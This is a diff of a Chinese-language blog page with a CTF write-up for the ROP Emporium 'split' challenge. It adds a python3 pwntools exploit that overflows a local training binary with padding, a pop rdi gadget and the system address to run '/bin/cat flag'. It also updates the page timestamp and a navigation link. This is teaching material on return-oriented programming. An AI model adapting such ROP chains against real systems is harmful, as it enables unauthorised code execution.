@@ -487,6 +487,7 @@
 
 
 
+<p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'split'</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'%#X system'</span>, elf.symbols.system)</span><br><span class="line">system = p64(elf.symbols.system)</span><br><span class="line"></span><br><span class="line">print_flag = p64(elf.symbols.usefulString)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>,<span class="string">'latin-1'</span>) * <span class="number">40</span> <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0x400884</span>) <span class="comment"># ret; 16进制对其</span></span><br><span class="line">payload += p64(<span class="number">0x400883</span>) <span class="comment"># gadget: pop rdi;ret</span></span><br><span class="line">payload += p64(<span class="number">0x601060</span>) <span class="comment"># '/bin/cat flag'</span></span><br><span class="line">payload += p64(<span class="number">0x4005e0</span>) <span class="comment"># systemaddr</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">flag = io.recvall()</span><br><span class="line">print(<span class="string">'FLAG: '</span> + str(flag,<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
 
 <p>python3 版本的pwntools。</p>
@@ -509,7 +510,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-18T10:11:24+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-18T10:14:07+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2020年4月18日</p>
@@ -586,6 +587,16 @@
         
         
           <div class="prev-next">
+            
+              <a class='prev' href='/2020/04/17/callme/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ROPEmporium callme</p>
+                <p class='content'>Callme这个题没什么好说的。直接找gadget进行构造就行了。
+
+
+环境： ubuntu18.04 、 pwntools(py3)
+exp.py
+1234567891011121314151...</p>
+              </a>
             
             
               <a class='next' href='/2020/04/13/Pwntools%20%E4%B8%80%E4%BA%9B%E5%9D%91/'>
